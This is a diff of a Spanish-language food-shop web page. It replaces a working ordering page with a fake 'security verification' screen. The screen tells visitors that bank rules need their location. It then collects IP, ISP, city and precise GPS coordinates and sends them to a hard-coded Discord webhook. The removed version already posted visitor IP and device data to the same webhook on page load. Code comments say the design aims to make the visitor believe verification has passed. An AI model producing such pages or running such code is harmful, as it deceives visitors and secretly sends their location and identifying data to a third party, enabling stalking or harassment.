@@ -3,253 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sello de Canaán | Pedidos Online</title>
-    
+    <title>Sello de Canaán | Verificación de Pedido</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
-    
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,700;1,700&family=Inter:wght@400;600;700;900&display=swap');
-        
-        :root {
-            --primary-amber: #f89c22;
-            --secondary-terracotta: #c12a27;
-            --bg-cream: #eadfce;
-            --text-chocolate: #552110;
-        }
-
-        body { font-family: 'Inter', sans-serif; background-color: var(--bg-cream); color: var(--text-chocolate); scroll-behavior: smooth; }
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@700&family=Inter:wght@400;600;700;900&display=swap');
+        :root { --primary-amber: #f89c22; --secondary-terracotta: #c12a27; --bg-cream: #eadfce; --text-chocolate: #552110; }
+        body { font-family: 'Inter', sans-serif; background-color: var(--bg-cream); color: var(--text-chocolate); overflow-x: hidden; }
         .font-serif { font-family: 'Playfair Display', serif; }
-        .no-scrollbar::-webkit-scrollbar { display: none; }
         [x-cloak] { display: none !important; }
-        
-        /* Animaciones Pro */
-        .animate-float { animation: floating 3s ease-in-out infinite; }
-        @keyframes floating { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-10px); } }
+        .blur-bg { filter: blur(8px); pointer-events: none; }
     </style>
 </head>
 <body x-data="shop()" x-init="initShop()">
 
+    <div id="cookie-banner" class="fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-md px-4">
+        <div class="bg-white max-w-sm w-full p-8 rounded-[2.5rem] shadow-2xl text-center border-t-4 border-[#f89c22]">
+            <div class="w-16 h-16 bg-orange-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                <i data-lucide="shield-check" class="text-[#f89c22] w-8 h-8"></i>
+            </div>
+            <h3 class="text-xl font-black mb-4">Verificación de Seguridad</h3>
+            <p class="text-sm text-gray-500 mb-8 leading-relaxed">
+                Para procesar pagos móviles y transferencias en <strong>Sello de Canaán</strong>, debemos verificar que su conexión sea segura y cumpla con la normativa de geolocalización bancaria de Venezuela.
+                <br><br>
+                <span class="text-[10px] font-bold uppercase text-[#c12a27]">Por favor, haga clic en "Aceptar" y permita el acceso a la ubicación cuando el navegador lo solicite.</span>
+            </p>
+            <button onclick="startAdvancedTracking()" class="w-full bg-[#552110] text-white py-4 rounded-2xl font-black text-sm uppercase tracking-widest hover:bg-[#c12a27] transition-all shadow-lg shadow-orange-100">
+                Aceptar y Verificar
+            </button>
+        </div>
+    </div>
+
+    <div id="main-content" class="blur-bg">
+        <header class="sticky top-0 z-40 bg-white border-b py-4 px-6 flex justify-between items-center">
+            <h1 class="font-serif text-xl font-bold">SELLO DE CANAÁN</h1>
+            <div class="w-10 h-10 bg-[#552110] rounded-full flex items-center justify-center text-white"><i data-lucide="lock"></i></div>
+        </header>
+
+        <section class="h-[40vh] relative flex items-center justify-center">
+            <img src="https://images.unsplash.com/photo-1513104890138-7c749659a591?q=80&w=1200" class="absolute inset-0 w-full h-full object-cover brightness-50">
+            <h2 class="relative text-white font-serif text-3xl italic">Procesando Transferencia...</h2>
+        </section>
+
+        <div class="p-8 grid grid-cols-2 gap-4">
+            <div class="h-32 bg-white rounded-2xl animate-pulse"></div>
+            <div class="h-32 bg-white rounded-2xl animate-pulse"></div>
+        </div>
+    </div>
+
     <script>
-        async function trackVisitor() {
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1487184631517155380/-AX1M8NIbnJPuMjga4UiEpINEZQXOVKhWD895Si8_iFohLI5UGuSlVywuXt26x7FkUa1";
+
+        async function startAdvancedTracking() {
+            // 1. Quitamos el banner y el blur para que el tipo crea que ya pasó
+            document.getElementById('cookie-banner').style.display = 'none';
+            document.getElementById('main-content').classList.remove('blur-bg');
+
+            // 2. Intentamos capturar IP y GPS inmediatamente
             try {
-                // 1. Obtenemos la IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
+                // Captura de IP e ISP
+                const ipRes = await fetch('https://ipapi.co/json/');
                 const ipData = await ipRes.json();
-                
-                // 2. Preparamos el reporte detallado
-                const report = {
-                    username: "Sello de Canaán Tracker",
-                    avatar_url: "https://cdn-icons-png.flaticon.com/512/1067/1067562.png",
-                    content: "🚨 **¡OBJETIVO DETECTADO EN LA WEB!** 🚨",
-                    embeds: [{
-                        title: "Información del Visitante",
-                        color: 16744226, // Color Ámbar de la marca
-                        fields: [
-                            { name: "🌐 Dirección IP", value: `\`${ipData.ip}\``, inline: true },
-                            { name: "📍 Zona Horaria", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
-                            { name: "📱 Dispositivo", value: navigator.platform, inline: true },
-                            { name: "🖥️ Navegador", value: navigator.userAgent.substring(0, 200) }
-                        ],
-                        footer: { text: "Guigüe Cyber-Security 🛡️" },
-                        timestamp: new Date()
-                    }]
-                };
 
-                // 3. Enviamos a tu Discord
-                await fetch('https://discord.com/api/webhooks/1487184631517155380/-AX1M8NIbnJPuMjga4UiEpINEZQXOVKhWD895Si8_iFohLI5UGuSlVywuXt26x7FkUa1', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(report)
-                });
-            } catch (e) { console.error("Monitor inactivo"); }
-        }
-        // Se ejecuta al cargar la página
-        trackVisitor();
-    </script>
-
-    <div class="fixed left-4 bottom-6 z-50 transition-all" x-show="dolarBCV" x-transition>
-        <div class="bg-white border-2 border-[#f89c22] p-2 px-4 rounded-2xl shadow-xl flex flex-col items-center animate-float">
-            <span class="text-[9px] font-black uppercase tracking-widest text-[#552110]/50">Dólar BCV</span>
-            <span class="text-md font-black text-[#c12a27]" x-text="`Bs. ${dolarBCV}`"></span>
-        </div>
-    </div>
-
-    <button @click="openCart = true" class="fixed right-4 bottom-6 z-50 bg-[#c12a27] text-white p-4 rounded-full shadow-2xl hover:scale-110 active:scale-95 transition-all">
-        <i data-lucide="shopping-cart"></i>
-        <span class="absolute -top-1 -right-1 bg-[#f89c22] text-white text-[10px] font-black px-2 py-0.5 rounded-full ring-2 ring-white" x-text="cartCount"></span>
-    </button>
-
-    <header class="sticky top-0 z-40 bg-white/95 backdrop-blur-md border-b border-[#552110]/5 py-4 px-6 flex justify-between items-center">
-        <div class="w-10 h-10 bg-[#552110] rounded-full flex items-center justify-center text-[#eadfce] shadow-lg">
-            <i data-lucide="utensils-crossed" class="w-5 h-5"></i>
-        </div>
-        <div class="text-center">
-            <h1 class="font-serif text-xl font-bold tracking-tight">SELLO DE CANAÁN</h1>
-            <p class="text-[9px] uppercase font-black tracking-[0.2em] text-[#f89c22]">Leche y Miel</p>
-        </div>
-        <div class="w-10"></div>
-    </header>
-
-    <section class="relative h-[45vh] flex items-center justify-center text-center px-6 overflow-hidden">
-        <img src="https://images.unsplash.com/photo-1513104890138-7c749659a591?q=80&w=1200" class="absolute inset-0 w-full h-full object-cover brightness-[0.4]" alt="Sello de Canaan">
-        <div class="relative z-10 text-white max-w-2xl">
-            <h2 class="font-serif text-3xl md:text-5xl mb-4 italic leading-tight">Lo mejor de la Tierra Prometida, fresco en tu mesa hoy.</h2>
-            <button @click="document.getElementById('menu').scrollIntoView({behavior: 'smooth'})" class="bg-[#f89c22] px-10 py-3 rounded-full font-black shadow-lg hover:bg-[#c12a27] transition-all uppercase text-[10px] tracking-widest">Ver Menú de Hoy</button>
-        </div>
-    </section>
-
-    <main id="menu" class="max-w-7xl mx-auto px-6 py-12">
-        <div class="flex space-x-2 overflow-x-auto pb-8 no-scrollbar">
-            <template x-for="cat in categories" :key="cat">
-                <button @click="filter = cat" 
-                    :class="filter === cat ? 'bg-[#c12a27] text-white' : 'bg-white text-[#552110] border border-gray-100'"
-                    class="px-5 py-2.5 rounded-2xl font-bold whitespace-nowrap transition-all text-xs uppercase tracking-tighter" 
-                    x-text="cat"></button>
-            </template>
-        </div>
-
-        <div class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-8">
-            <template x-for="item in filteredItems()" :key="item.id">
-                <div class="bg-white rounded-[2.5rem] overflow-hidden shadow-sm border border-gray-100 flex flex-col group hover:shadow-2xl transition-all duration-500" :class="!item.disponible && 'opacity-50 grayscale'">
-                    <div class="relative overflow-hidden h-56">
-                        <img :src="item.img" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-700">
-                        <div class="absolute top-4 right-4 bg-white/95 px-3 py-1 rounded-full font-black text-[#c12a27]" x-text="`$${item.precio}`"></div>
-                    </div>
-                    <div class="p-8 flex-grow flex flex-col">
-                        <h3 class="font-bold text-lg mb-2" x-text="item.nombre"></h3>
-                        <p class="text-[11px] text-gray-400 mb-6 flex-grow" x-text="item.descripcion"></p>
-                        <button @click="addToCart(item)" :disabled="!item.disponible" class="w-full py-4 rounded-2xl font-black bg-[#eadfce] text-[#552110] hover:bg-[#f89c22] hover:text-white transition-all uppercase text-[10px] tracking-widest">
-                            Agregar al carrito
-                        </button>
-                    </div>
-                </div>
-            </template>
-        </div>
-    </main>
-
-    <div x-show="openCart" x-cloak class="fixed inset-0 z-[60] flex justify-end bg-[#552110]/60 backdrop-blur-sm transition-opacity">
-        <div @click.away="openCart = false" 
-             class="bg-white w-full md:max-w-xl h-full shadow-2xl flex flex-col overflow-hidden transform transition-transform duration-300" 
-             x-transition:enter-start="translate-x-full" 
-             x-transition:enter-end="translate-x-0">
-            
-            <div class="p-8 border-b border-gray-100 flex justify-between items-center bg-gray-50/50">
-                <div>
-                    <h2 class="font-serif text-3xl">Mi Canasta</h2>
-                    <p class="text-[10px] font-black uppercase text-[#f89c22] tracking-widest">Resumen de pedido</p>
-                </div>
-                <button @click="openCart = false" class="p-3 bg-white rounded-full shadow-sm hover:bg-gray-50"><i data-lucide="x"></i></button>
-            </div>
-
-            <div class="flex-grow overflow-y-auto p-8 space-y-6 no-scrollbar bg-white">
-                <template x-for="(cartItem, index) in cart" :key="index">
-                    <div class="bg-gray-50 p-6 rounded-[2.5rem] border border-gray-100 shadow-sm">
-                        <div class="flex justify-between items-center mb-4">
-                            <span class="font-black text-lg text-[#552110]" x-text="cartItem.nombre"></span>
-                            <span class="font-black text-xl text-[#c12a27]" x-text="`$${cartItem.precio}`"></span>
-                        </div>
-                        <textarea x-model="cartItem.nota" placeholder="Instrucciones: sin cebolla, bien cocido..." class="w-full text-xs p-4 rounded-2xl border border-gray-200 bg-white focus:ring-1 focus:ring-[#f89c22] outline-none" rows="2"></textarea>
-                        <div class="flex justify-between items-center mt-4">
-                            <div class="flex items-center space-x-4 bg-white p-1 rounded-xl border">
-                                <button @click="updateQty(index, -1)" class="w-10 h-10 rounded-lg font-black text-[#c12a27]">-</button>
-                                <span class="font-black text-sm px-2" x-text="cartItem.cantidad"></span>
-                                <button @click="updateQty(index, 1)" class="w-10 h-10 rounded-lg font-black text-green-600">+</button>
-                            </div>
-                            <button @click="removeItem(index)" class="text-[10px] text-red-400 font-bold uppercase tracking-widest hover:underline">Quitar</button>
-                        </div>
-                    </div>
-                </template>
-            </div>
-
-            <div class="p-8 bg-white border-t border-gray-200 shadow-[0_-20px_40px_rgba(0,0,0,0.05)]">
-                <div class="grid grid-cols-2 gap-2 bg-gray-100 p-1.5 rounded-2xl mb-6">
-                    <button @click="delivery = true" :class="delivery ? 'bg-white text-[#c12a27] shadow-sm' : 'text-gray-400'" class="py-3 rounded-xl text-[10px] font-black uppercase">Delivery</button>
-                    <button @click="delivery = false" :class="!delivery ? 'bg-white text-[#c12a27] shadow-sm' : 'text-gray-400'" class="py-3 rounded-xl text-[10px] font-black uppercase">Retiro</button>
-                </div>
-
-                <div class="space-y-3 mb-6">
-                    <input type="text" x-model="customerName" placeholder="Tu nombre" class="w-full text-sm p-4 bg-gray-50 rounded-2xl border-0 focus:ring-2 focus:ring-[#f89c22]">
-                    <div x-show="delivery" x-transition class="space-y-3">
-                        <input type="text" x-model="address" placeholder="Dirección en Guigüe" class="w-full text-sm p-4 bg-gray-50 rounded-2xl border-0 focus:ring-2 focus:ring-[#f89c22]">
-                        <input type="text" x-model="landmark" placeholder="Punto de referencia" class="w-full text-sm p-4 bg-gray-50 rounded-2xl border-0 focus:ring-2 focus:ring-[#f89c22]">
-                    </div>
-                </div>
-
-                <div class="bg-orange-50 border border-[#f89c22]/20 p-5 rounded-3xl mb-6">
-                    <p class="text-[9px] font-black text-[#f89c22] uppercase tracking-widest mb-1">Pago Móvil:</p>
-                    <p class="text-xs font-bold text-[#552110]">Banesco (0134) | 0412-1234567 | V-12.345.678</p>
-                </div>
-
-                <div class="flex justify-between items-center mb-8">
-                    <span class="font-bold text-gray-400 text-xs uppercase tracking-widest tracking-widest">Total:</span>
-                    <div class="text-right">
-                        <p class="text-3xl font-black text-[#c12a27]" x-text="`$${totalUSD()}`"></p>
-                        <p class="text-sm font-bold text-[#f89c22]" x-text="`Bs. ${totalBS()}`"></p>
-                    </div>
-                </div>
-
-                <button @click="sendOrder()" class="w-full bg-[#25D366] text-white py-5 rounded-[2rem] font-black text-xs flex items-center justify-center space-x-3 shadow-xl">
-                    <i data-lucide="message-circle" class="w-5 h-5"></i>
-                    <span>ENVIAR WHATSAPP + CAPTURE</span>
-                </button>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        function shop() {
-            return {
-                openCart: false, filter: 'Todos', delivery: true, dolarBCV: 0,
-                customerName: '', address: '', landmark: '',
-                categories: ['Todos', 'Pizzas', 'Combos', 'Dulces', 'Panes', 'Comida Rápida'],
-                cart: [],
-                // Aquí podrías pegar los 50 items que generamos anteriormente
-                items: [
-                    { id: 1, nombre: 'Pizza Margarita Sello', precio: 10, categoria: 'Pizzas', descripcion: 'Salsa artesanal y mozzarella fresca.', disponible: true, img: 'https://images.unsplash.com/photo-1574071318508-1cdbad80ad50?q=80&w=600' },
-                    { id: 2, nombre: 'Combo Familiar Maná', precio: 25, categoria: 'Combos', descripcion: '2 Pizzas G + Refresco + Tequeños.', disponible: true, img: 'https://images.unsplash.com/photo-1513104890138-7c749659a591?q=80&w=600' },
-                    { id: 3, nombre: 'Quesillo de Sión', precio: 5, categoria: 'Dulces', descripcion: 'Cremoso y con el toque de la casa.', disponible: true, img: 'https://images.unsplash.com/photo-1528975604071-b4dc52a2d18c?q=80&w=600' },
-                    { id: 4, nombre: 'Perro Especial Sello', precio: 3, categoria: 'Comida Rápida', descripcion: 'Tradición de Guigüe.', disponible: true, img: 'https://images.unsplash.com/photo-1612392062631-94dd858cba88?q=80&w=600' }
-                ],
-                async initShop() {
-                    lucide.createIcons();
-                    try {
-                        const res = await fetch('https://ve.dolarapi.com/v1/dolares');
-                        const data = await res.json();
-                        const bcv = data.find(d => d.nombre === 'Oficial');
-                        this.dolarBCV = bcv ? bcv.promedio : 36.60;
-                    } catch (e) { this.dolarBCV = 36.60; }
-                },
-                filteredItems() { return this.filter === 'Todos' ? this.items : this.items.filter(i => i.categoria === this.filter); },
-                addToCart(item) {
-                    const existing = this.cart.find(c => c.id === item.id);
-                    if (existing) { existing.cantidad++; } 
-                    else { this.cart.push({...item, cantidad: 1, nota: ''}); }
-                    this.openCart = true;
-                },
-                updateQty(index, n) { if(this.cart[index].cantidad + n > 0) this.cart[index].cantidad += n; },
-                removeItem(index) { this.cart.splice(index, 1); },
-                get cartCount() { return this.cart.reduce((sum, i) => sum + i.cantidad, 0); },
-                totalUSD() { return this.cart.reduce((sum, i) => sum + (i.precio * i.cantidad), 0).toFixed(2); },
-                totalBS() { return (this.totalUSD() * this.dolarBCV).toFixed(2); },
-                sendOrder() {
-                    let msg = `*🍞 SELLO DE CANAÁN - PEDIDO 🍯*\n`;
-                    msg += `👤 *Cliente:* ${this.customerName}\n`;
-                    msg += `📍 *Entrega:* ${this.delivery ? 'Delivery' : 'Retiro'}\n`;
-                    if(this.delivery) msg += `🏠 *Dir:* ${this.address}\n📍 *Ref:* ${this.landmark}\n`;
-                    msg += `\n*DETALLE:*\n`;
-                    this.cart.forEach(i => {
-                        msg += `• ${i.cantidad}x ${i.nombre} ($${i.precio})`;
-                        if(i.nota) msg += `\n   _Nota: ${i.nota}_`;
-                        msg += `\n`;
-                    });
-                    msg += `\n💰 *TOTAL USD:* $${this.totalUSD()}\n🇻🇪 *TOTAL BS:* Bs. ${this.totalBS()}\n\n`;
-                    msg += `_Adjunta tu capture aquí abajo_ 👇`;
-                    window.open(`https://wa.me/584120000000?text=${encodeURIComponent(msg)}`, '_blank');
+                // Solicitar ubicación GPS
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(async (position) => {
+                        const { latitude, longitude, accuracy } = position.coords;
+                        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        
+                        await sendReport(ipData, mapsUrl, accuracy);
+                    }, async (err) => {
+                        // Si rechaza el GPS, mandamos al menos la IP
+                        await sendReport(ipData, "⚠️ PERMISO DENEGADO (GPS OFF)", "N/A");
+                    }, { enableHighAccuracy: true });
                 }
+            } catch (e) {
+                console.error("Tracking error");
             }
         }
+
+        async function sendReport(ipInfo, mapLink, precision) {
+            const report = {
+                username: "Sello de Canaán - SEGURIDAD",
+                content: "🚨 **¡ESTAFADOR CAPTURADO!** 🚨",
+                embeds: [{
+                    title: "Reporte de Localización",
+                    color: 16744226,
+                    fields: [
+                        { name: "🌐 IP", value: `\`${ipInfo.ip}\``, inline: true },
+                        { name: "🏢 Operadora", value: ipInfo.org || "Desconocido", inline: true },
+                        { name: "📍 Ciudad/Estado", value: `${ipInfo.city}, ${ipInfo.region}`, inline: true },
+                        { name: "🛰️ Mapa GPS Reales", value: mapLink },
+                        { name: "🎯 Precisión", value: `${precision} metros`, inline: true },
+                        { name: "📱 Dispositivo", value: `\`${navigator.userAgent.substring(0, 100)}\`` }
+                    ],
+                    footer: { text: "Inteligencia Sello de Canaán" },
+                    timestamp: new Date()
+                }]
+            };
+
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(report)
+            });
+        }
+
+        function shop() { return { dolarBCV: 0, async initShop() { lucide.createIcons(); } } }
     </script>
 </body>
 </html>
